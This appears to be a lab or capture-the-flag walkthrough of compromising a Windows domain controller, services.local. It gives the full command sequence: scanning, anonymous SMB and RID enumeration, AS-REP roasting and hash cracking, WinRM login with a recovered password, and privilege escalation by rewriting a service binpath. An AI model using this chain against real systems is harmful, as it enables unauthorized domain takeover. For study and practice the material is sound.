<img width="650" height="212" alt="image" src="https://github.com/user-attachments/assets/cebfa041-d2da-4d61-9389-9ab4b44129c3" />
<img width="650" height="212" alt="image" src="https://github.com/user-attachments/assets/bbed6211-4046-49c4-a1a4-44bcf53d33bd" />

# Nmap 

```
nmap -p- -Pn $target -v --min-rate 5000 max-rtt-timeout 1000 --max-retries 5 -oN nmap_ports.txt
```
<img width="500" height="707" alt="image" src="https://github.com/user-attachments/assets/f960c576-f389-4751-a2e4-c866f6a778c4" />

```
nmap -Pn $target -sVC -v -oN nmap_svc.txt
```
<img width="911" height="668" alt="image" src="https://github.com/user-attachments/assets/a8bcb8aa-3980-4d7e-955d-23a67dc50d6f" />

<img width="911" height="668" alt="image" src="https://github.com/user-attachments/assets/2a0661e9-328f-4ec5-a98f-2015067cdbc1" />

<img width="872" height="336" alt="image" src="https://github.com/user-attachments/assets/bbc10b3b-0b31-4a26-9119-af6815ea7305" />

```
nmap -T5 -Pn $target -v --script vuln -oN vuln_scan.txt
```
<img width="892" height="597" alt="image" src="https://github.com/user-attachments/assets/6c6ad12b-ac08-4739-89e5-52e4513a48e1" />

# Smb

lets enumerate smb and try to access anonymous access

We will try to enumerate users/domain using windows security identifiers

```
netexec smb $target
```

```
netexec smb $target -u '' -p ''
```

```
netexec smb $target -u '' -p ''
```

```
netexec smb $target -u '' -p '' --rid-brute
```


<img width="932" height="446" alt="image" src="https://github.com/user-attachments/assets/d03fc78f-7f0e-421b-8556-03b054fad73e" />


Add domain address and ip address to the known hosts 

<img width="600" height="194" alt="image" src="https://github.com/user-attachments/assets/ad98ad54-d22d-482b-affd-016deda04b3e" />

<img width="1244" height="498" alt="image" src="https://github.com/user-attachments/assets/6b682ff3-b16f-4f40-8cfa-06c052f62ada" />

<img width="911" height="217" alt="image" src="https://github.com/user-attachments/assets/cebcaff7-433b-42bc-87fc-9466d9af8ad3" />


```
kerbrute userenum generated_username.txt --dc $target -d services.local
```

<img width="809" height="325" alt="image" src="https://github.com/user-attachments/assets/cf7737f9-578e-44fb-b95d-9afce28b2775" />

<img width="560" height="273" alt="image" src="https://github.com/user-attachments/assets/73ec6a55-d49c-4e67-9da1-4d47b8fb2950" />

```
impacket-GetNPUsers services.local/ -dc-ip $target -u valid_usernames.txt -outputfile hashes.txt
```
<img width="921" height="214" alt="image" src="https://github.com/user-attachments/assets/92d3082f-9bd3-4e3f-aa2b-351eea0476be" />

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
<img width="921" height="208" alt="image" src="https://github.com/user-attachments/assets/d3f74597-9116-462a-8dee-3e8823cb11c0" />

```
crackmapexec winrm $target -u j.rock -p Serviceworks1
```

<img width="896" height="165" alt="image" src="https://github.com/user-attachments/assets/5e24dcbd-3b62-4949-aefe-c217064c1459" />

```
evil-winrm -u j.rock -p Serviceworks1 -i $target
```

<img width="538" height="109" alt="image" src="https://github.com/user-attachments/assets/04670e2a-faa5-41fc-8c2d-6a4fd9ce33ca" />

<img width="718" height="270" alt="image" src="https://github.com/user-attachments/assets/23b2bd4a-9a4d-41fa-bb95-ce41fc476e30" />


```
whoami /all
```
<img width="956" height="667" alt="image" src="https://github.com/user-attachments/assets/8b2cd18d-fa09-4ab2-aad2-abdce1ea3805" />

We will be exploititng this group as it is priviliged
 we can check all the services running 
```
services
```
<img width="877" height="274" alt="image" src="https://github.com/user-attachments/assets/8d36f2d5-dc35-4e7b-87e2-6ffaf108f58a" />

We will execute the binary of these files to add j.rock into administrators group

<img width="748" height="439" alt="image" src="https://github.com/user-attachments/assets/fce9664e-5e91-4292-b53f-496ebac9dc50" />

```
sc.exe qc ADWS
```
```
sc.exe config ADWS binpath="net localgroup administrators j.rock /add"
```
<img width="913" height="458" alt="image" src="https://github.com/user-attachments/assets/2e9bb5a3-c109-491e-b32a-8a32507ee088" />

```
sc.exe stop ADWS
sc.exe start ADWS
```
<img width="766" height="455" alt="image" src="https://github.com/user-attachments/assets/f4601291-e468-4de0-ac55-3ed4fc6e70d8" />

```
net user j.rock
```

<img width="715" height="454" alt="image" src="https://github.com/user-attachments/assets/be6489e3-15a2-4b4c-bca9-027c8a3ef671" />

Exit the j.rock and login again to execute administrator access and change the administrator password

```
net user administrator password123!
```
<img width="694" height="110" alt="image" src="https://github.com/user-attachments/assets/0d511c31-02f5-4a83-a02e-a5eb187773b7" />

Login using those credentials

<img width="946" height="286" alt="image" src="https://github.com/user-attachments/assets/f2e5033f-9574-48ae-aa76-c1f48c8183e5" />

<img width="571" height="183" alt="image" src="https://github.com/user-attachments/assets/9a60c6b2-bec0-49cc-a900-dd49917d593b" />




